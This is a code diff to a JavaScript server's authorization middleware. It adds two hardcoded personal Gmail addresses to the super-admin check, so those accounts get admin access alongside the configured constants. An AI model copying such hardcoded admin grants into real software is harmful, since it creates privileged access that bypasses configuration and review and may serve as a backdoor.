@@ -676,7 +676,12 @@ async function startServer() {
     }
 
     // 2. Recognized Super Admin email or registered admin user
-    if (actorEmail === WORKSPACE_ADMIN_EMAIL || actorEmail === SUPER_ADMIN_EMAIL) {
+    if (
+      actorEmail === WORKSPACE_ADMIN_EMAIL ||
+      actorEmail === SUPER_ADMIN_EMAIL ||
+      actorEmail === 'dienhazizahhati@gmail.com' ||
+      actorEmail === 'sdnpengasinantujuh@gmail.com'
+    ) {
       next();
       return;
     }
